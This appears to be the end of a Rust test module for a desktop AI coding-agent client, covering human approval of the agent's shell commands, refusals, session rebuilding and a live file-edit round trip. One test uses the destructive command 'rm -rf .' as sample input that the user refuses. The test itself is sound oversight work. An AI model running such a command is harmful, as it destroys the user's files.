            Some(Turn::User(text)) => assert!(text.contains("Review this diff")),
            other => panic!("expected the review's own row, got {other:?}"),
        }
    }

    /// A turn in flight is still changing the files the diff describes.
    #[test]
    fn the_review_pass_waits_for_the_turn_it_is_about() {
        let mut s = State { sending: true, ..open_state() };
        let _ = update(&mut s, &client(), Message::ReviewTurn("abc123".into()));
        assert_eq!(s.turns.len(), 0, "nothing was asked while the turn was still running");
    }

    /// The approve route returns as soon as it pauses, so `Done` arrives right
    /// behind `approval_required`. That must not be read as a turn that ended
    /// badly — it is a turn waiting on a human.
    #[test]
    fn the_stream_closing_behind_an_approval_is_not_a_dead_turn() {
        let mut s = State { sending: true, autonomy: Autonomy::Ask, ..open_state() };
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ApprovalRequired {
                call_id: "c1".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({ "command": "cargo test" }),
            }),
        );
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        assert!(s.pending.is_some(), "the decision is still outstanding");
        assert_eq!(s.error, None, "waiting on a human is not a silent turn");
    }

    #[test]
    fn a_command_shows_itself_rather_than_the_tool_that_runs_it() {
        assert_eq!(
            label_for("run_command", &serde_json::json!({ "command": "cargo test" })),
            "$ cargo test"
        );
        assert_eq!(label_for("list_dir", &serde_json::json!({})), "list_dir .");
    }

    /// Seen live under `Autonomy::Auto`, where there is no card to catch it:
    /// `qwen3-coder:30b` emitted `run_command {}` and the row for it read `$ `.
    /// A tier that runs commands unasked makes this row the only thing the user
    /// gets, so it has to say something.
    #[test]
    fn a_command_with_nothing_in_it_still_names_itself() {
        assert_eq!(
            label_for("run_command", &serde_json::json!({})),
            "run_command (unreadable)"
        );
        assert_eq!(
            label_for("run_command", &serde_json::json!({ "command": "   " })),
            "run_command (unreadable)"
        );
    }

    #[test]
    fn an_approval_pause_stops_the_turn_until_it_is_decided() {
        let mut s = State { sending: true, autonomy: Autonomy::Ask, ..open_state() };
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ApprovalRequired {
                call_id: "c9".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({ "command": "rm -rf ." }),
            }),
        );
        assert!(!s.sending, "nothing is in flight while it waits on a human");
        assert_eq!(s.pending.as_ref().unwrap().command, "rm -rf .");
        // No row yet: the resumed turn emits the real `tool_call` and a row
        // pushed here would sit beside it as a duplicate.
        assert!(s.turns.is_empty());
        // A send while a decision is outstanding must not open a second turn —
        // it queues behind the one waiting on the user, and nothing is lost.
        s.draft = "never mind".into();
        let _ = update(&mut s, &client(), Message::Send);
        assert_eq!(s.queue, vec!["never mind"]);
        assert!(!s.sending, "still the user's move");

        let _ = update(&mut s, &client(), Message::Decide(false));
        // Still pending until the server acts on the refusal — the card is
        // hidden by `sending`, not by dropping the call.
        assert!(s.sending);
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        assert!(s.pending.is_none());
        // A refusal produces no `tool_call`, so the refusal *is* the row.
        assert!(
            matches!(&s.turns[0], Turn::Tool { label, result: Some(Err(e)) }
                if label == "$ rm -rf ." && e.contains("refused"))
        );
    }

    /// Approving is the other half: the row must come from the resumed stream,
    /// exactly once. Seen on screen as two identical `$ python …` rows before
    /// it was seen in the code.
    /// Commands off means the executor refuses anyway, so asking first is a
    /// prompt whose only possible outcome is "no" — seen on screen: approved,
    /// then refused by the other gate.
    #[test]
    fn with_commands_off_the_user_is_never_asked() {
        let mut s = State { sending: true, ..open_state() };
        assert!(!s.autonomy.allows_commands());
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ApprovalRequired {
                call_id: "c9".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({ "command": "cargo test" }),
            }),
        );
        assert!(s.pending.is_none(), "no card for a decision that is already made");
        assert!(
            matches!(&s.turns[0], Turn::Tool { label, result: Some(Err(e)) }
                if label == "$ cargo test" && e.contains("commands are off"))
        );

        // The model often says nothing after a refusal. Blaming its ability to
        // hold a tool loop would point the user at the wrong setting.
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        let banner = s.error.clone().unwrap_or_default();
        assert!(banner.contains("commands are off"), "{banner}");
        assert!(!banner.contains("tool loop"), "{banner}");
    }

    /// Seen live: a model leaked `</tool_call>` as prose, the server salvaged a
    /// `run_command` with no `command` in it, and the card offered a live Run
    /// button over an empty box.
    #[test]
    fn a_call_with_no_command_in_it_leaves_nothing_to_approve() {
        let mut s = State { sending: true, autonomy: Autonomy::Ask, ..open_state() };
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ApprovalRequired {
                call_id: "c1".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({}),
            }),
        );
        assert_eq!(s.pending.as_ref().unwrap().command, "", "the view hides Run on this");
        assert_eq!(command_of(&serde_json::json!({ "command": "  " })), "");
        assert_eq!(command_of(&serde_json::json!({ "command": " ls " })), "ls");

        // Dismissing it is a refusal, and its row has no command to name.
        let _ = update(&mut s, &client(), Message::Decide(false));
        assert!(matches!(&s.turns[0], Turn::Tool { label, .. } if label.contains("unreadable")));
    }

    /// Seen live: the approve POST failed in transport, the client had already
    /// dropped `pending`, and the server was left holding the call — every
    /// later send came back "Thread has a command awaiting approval", with no
    /// card left to answer it from. The decision only counts once the server
    /// acts on it.
    #[test]
    fn a_decision_that_never_reached_the_server_can_be_answered_again() {
        let mut s = State { sending: true, autonomy: Autonomy::Ask, ..open_state() };
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ApprovalRequired {
                call_id: "c9".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({ "command": "cargo test" }),
            }),
        );
        let _ = update(&mut s, &client(), Message::Decide(true));
        assert!(s.pending.is_some(), "still outstanding until the server says otherwise");
        assert!(s.sending, "…but the card is hidden while it is in flight");

        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Failed("no route".into())));
        assert!(s.pending.is_some(), "the card comes back so it can be retried");
        assert!(!s.sending);
        assert!(s.error.as_deref().unwrap_or_default().contains("Answer it again"));

        // Retrying, and this time the server acts on it.
        let _ = update(&mut s, &client(), Message::Decide(true));
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolCall {
                call_id: "c9".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({ "command": "cargo test" }),
            }),
        );
        assert!(s.pending.is_none(), "answered for real now");
    }

    #[test]
    fn approving_leaves_the_row_to_the_resumed_turn() {
        let mut s = State { sending: true, autonomy: Autonomy::Ask, ..open_state() };
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ApprovalRequired {
                call_id: "c9".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({ "command": "cargo test" }),
            }),
        );
        let _ = update(&mut s, &client(), Message::Decide(true));
        assert!(s.turns.is_empty(), "approving adds nothing on its own");

        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolCall {
                call_id: "c9".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({ "command": "cargo test" }),
            }),
        );
        assert_eq!(s.turns.len(), 1, "one row for one command");
    }

    /// Reopening a session has to produce the same rows the live stream did.
    /// The stored log is OpenAI-shaped — tool calls hang off the assistant turn
    /// that made them, with their arguments as a JSON *string* — so this is a
    /// different parse of the same conversation, and the two drifting apart is
    /// the failure that makes history untrustworthy.
    #[test]
    fn a_reopened_session_rebuilds_the_rows_the_stream_produced() {
        let stored = serde_json::json!([
            { "role": "system", "content": "You are a coding assistant" },
            { "role": "user", "content": "add farewell" },
            {
                "role": "assistant",
                "content": "Let me read it first.",
                "tool_calls": [{
                    "id": "c1",
                    "function": { "name": "read_file", "arguments": "{\"path\":\"src/a.py\"}" }
                }]
            },
            { "role": "tool", "tool_call_id": "c1", "name": "read_file", "content": "def greet(): ..." },
            {
                "role": "assistant",
                "content": "",
                "tool_calls": [{
                    "id": "c2",
                    "function": { "name": "write_file", "arguments": "{\"path\":\"src/a.py\"}" }
                }]
            },
            { "role": "tool", "tool_call_id": "c2", "name": "write_file", "content": "Wrote 40 bytes to src/a.py" },
            { "role": "assistant", "content": "Done." },
        ]);
        let turns = rebuild_turns(stored.as_array().unwrap());

        assert!(matches!(&turns[0], Turn::User(t) if t == "add farewell"));
        assert!(matches!(&turns[1], Turn::Assistant { text, .. } if text == "Let me read it first."));
        assert!(matches!(&turns[2], Turn::Tool { label, result: Some(Ok(r)) }
            if label == "read_file src/a.py" && r.starts_with("def greet")));
        // The tool-only step has empty content and must not leave a blank bubble.
        assert!(matches!(&turns[3], Turn::Tool { label, result: Some(Ok(_)) }
            if label == "write_file src/a.py"));
        assert!(matches!(&turns[4], Turn::Assistant { text, .. } if text == "Done."));
        assert_eq!(turns.len(), 5, "no system row, no blank assistant row");
    }

    #[test]
    fn a_session_that_ended_mid_call_reopens_with_that_row_closed() {
        let stored = serde_json::json!([
            { "role": "user", "content": "go" },
            {
                "role": "assistant",
                "content": "",
                "tool_calls": [{
                    "id": "c1",
                    "function": { "name": "run_command", "arguments": "{\"command\":\"pytest\"}" }
                }]
            },
        ]);
        let turns = rebuild_turns(stored.as_array().unwrap());
        assert!(matches!(&turns[1], Turn::Tool { label, result: Some(Err(e)) }
            if label == "$ pytest" && e.contains("never answered")));
    }

    /// Ported from hearth's composer: most specific first. A bare "thinking" for
    /// two minutes is how a wait on the approval gate reads as a hang.
    #[test]
    fn the_status_line_names_what_is_actually_being_waited_on() {
        let mut s = State { sending: true, ..open_state() };
        assert_eq!(s.activity(), "thinking");

        tool_call(&mut s, "src/big.rs");
        assert_eq!(s.activity(), "read_file src/big.rs", "the tool in flight beats the model");

        s.resolve_tool(Ok("...".into()));
        assert_eq!(s.activity(), "thinking", "answered calls stop counting");

        // The gate is only a wait on the user while nothing is in flight — once
        // the decision is sent, `pending` survives but the wait is the server's.
        s.sending = false;
        s.pending = Some(Pending { call_id: "c1".into(), command: "pytest".into() });
        assert_eq!(s.activity(), "waiting for you", "the user beats everything");
        s.sending = true;
        assert_eq!(s.activity(), "thinking", "a decision in flight is not a wait on the user");
    }

    #[test]
    fn the_clock_only_runs_while_a_turn_does() {
        let mut s = State { draft: "go".into(), ..open_state() };
        let _ = update(&mut s, &client(), Message::Send);
        for _ in 0..3 {
            let _ = update(&mut s, &client(), Message::Tick);
        }
        assert_eq!(s.elapsed, 3);
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        let _ = update(&mut s, &client(), Message::Tick);
        assert_eq!(s.elapsed, 3, "a finished turn stops counting");

        // But a turn parked on the gate has not finished, and that wait is the
        // longest one available here — the counter froze on it once.
        s.pending = Some(Pending { call_id: "c1".into(), command: "pytest".into() });
        let _ = update(&mut s, &client(), Message::Tick);
        assert_eq!(s.elapsed, 4, "the clock runs while it waits on a human");
        s.pending = None;

        // The next turn starts from zero rather than continuing the last one.
        s.draft = "again".into();
        let _ = update(&mut s, &client(), Message::Send);
        assert_eq!(s.elapsed, 0);
    }

    #[test]
    fn reopening_a_session_follows_its_folder_and_thread() {
        use agent_platform_client::types::CoderThreadOut;
        let mut s = State::with_root("D:/work/first");
        let _ = update(
            &mut s,
            &client(),
            Message::ThreadLoaded(Ok(Box::new(CoderThreadOut {
                thread_id: 42,
                title: "old one".into(),
                workspace_root: Some("D:/work/second".into()),
                model: None,
                messages: vec![serde_json::json!({ "role": "user", "content": "hi" })],
            }))),
        );
        assert_eq!(s.thread_id, Some(42));
        assert_eq!(s.root, Some(PathBuf::from("D:/work/second")), "the root travels with it");
        assert_eq!(s.turns.len(), 1);

        // Deleting the open session detaches it, so the next send opens a new
        // thread rather than writing into one the server no longer has.
        s.threads = vec![];
        let _ = update(&mut s, &client(), Message::DeleteThread(42));
        assert_eq!(s.delete_armed, Some(42), "first press only arms");
        assert_eq!(s.thread_id, Some(42));
        let _ = update(&mut s, &client(), Message::DeleteThread(42));
        assert_eq!(s.thread_id, None);
        assert_eq!(s.delete_armed, None);
    }

    /// The delegation round trip, against a live server and a real model.
    ///
    /// The unit tests above prove the state machine; none of them prove the
    /// protocol, which is the part with two processes in it — the server has to
    /// actually block on `(thread_id, call_id)`, and `coder_tool_result` has to
    /// actually unblock it. Everything here is the shipped code: the real
    /// stream, the real executor, the real client.
    ///
    /// `#[ignore]` because it needs a running platform and a tool-capable model.
    /// Run it with:
    ///
    /// ```text
    /// cargo test -p agent-platform-desktop -- --ignored --nocapture delegation
    /// ```
    ///
    /// Override the model with `CODER_TEST_MODEL` / `CODER_TEST_PROVIDER`. The
    /// defaults are what this machine actually serves — note that the alias has
    /// to be one the *routed* provider can load: an Ollama-style
    /// `gemma4:latest` sent at an LM Studio backend crashed llama-server rather
    /// than 404ing, which is how that got pinned down.
    #[tokio::test]
    #[ignore = "needs a running agent-platform and a tool-capable local model"]
    async fn delegation_round_trip_edits_a_real_file() {
        use futures::StreamExt;

        let key = std::fs::read_to_string(
            dirs::config_dir().unwrap().join(crate::shell::APP_DIR).join("master.key"),
        )
        .expect("no install key — start the desktop app once");
        let base = std::env::var("AGENT_PLATFORM_BASE")
            .unwrap_or_else(|_| "http://127.0.0.1:18410".into());
        let model = std::env::var("CODER_TEST_MODEL")
            .unwrap_or_else(|_| "qwen/qwen3-coder-30b".to_string());
        let provider =
            std::env::var("CODER_TEST_PROVIDER").unwrap_or_else(|_| "lm_studio".to_string());
        let client = Client::new(base, key.trim());

        let root = std::env::temp_dir().join("coder-delegation-e2e");
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        let root = std::fs::canonicalize(&root).unwrap();
        std::fs::write(root.join("greeting.txt"), "hello\n").unwrap();

        let thread = client
            .create_coder_thread(&root.display().to_string())
            .await
            .expect("could not open a coder thread")
            .thread_id;

        let body = serde_json::json!({
            "message": "Edit greeting.txt so it says goodbye instead of hello. \
                        Read it first, then write it back.",
            "thread_id": thread,
            "workspace_root": root.display().to_string(),
            "allow_commands": false,
            "auto_approve_commands": false,
            "delegate_tools": true,
            "model": model,
            "provider": provider,
        });

        let mut calls: Vec<String> = Vec::new();
        let drive = async {
            let mut stream =
                Box::pin(coder_stream(client.clone(), "/api/v1/coder/chat/stream", body));
            while let Some(event) = stream.next().await {
                match event {
                    CoderEvent::ToolCall { call_id, name, arguments } => {
                        calls.push(name.clone());
                        let result =
                            crate::coder_tools::execute(&root, &name, &arguments, false).await;
                        // The server is parked on this. If the POST fails the
                        // turn stalls, so a failure here is the test failing.
                        client
                            .coder_tool_result(thread, &call_id, &result)
                            .await
                            .expect("handing the tool result back failed");
                    }
                    CoderEvent::Failed(e) => panic!("stream failed: {e}"),
                    CoderEvent::Done => break,
                    _ => {}
                }
            }
        };
        tokio::time::timeout(std::time::Duration::from_secs(300), drive)
            .await
            .expect("the turn did not finish in 300s");

        // The trace is the useful half when this fails: a model that never
        // called a tool and one whose edit was refused look identical from the
        // file alone.
        eprintln!("[{model}] trace: {}", calls.join(" → "));
        let after = std::fs::read_to_string(root.join("greeting.txt")).unwrap();
        assert!(
            calls.iter().any(|c| c == "write_file"),
            "the model never wrote anything; calls were {calls:?}"
        );
        assert!(
            after.to_lowercase().contains("goodbye"),
            "the edit never reached disk. calls: {calls:?}, file: {after:?}"
        );
    }

    #[test]
    fn changing_folder_starts_a_new_thread_but_keeps_the_command_setting() {
        let mut s = State { autonomy: Autonomy::Ask, ..open_state() };
        s.turns.push(Turn::User("old".into()));
        let _ = update(&mut s, &client(), Message::RootPicked(Some("D:/work/other".into())));
        assert_eq!(s.thread_id, None, "the old thread names the old workspace root");
        assert!(s.turns.is_empty());
        assert!(s.autonomy.allows_commands());
        assert_eq!(s.root, Some(PathBuf::from("D:/work/other")));
    }
}
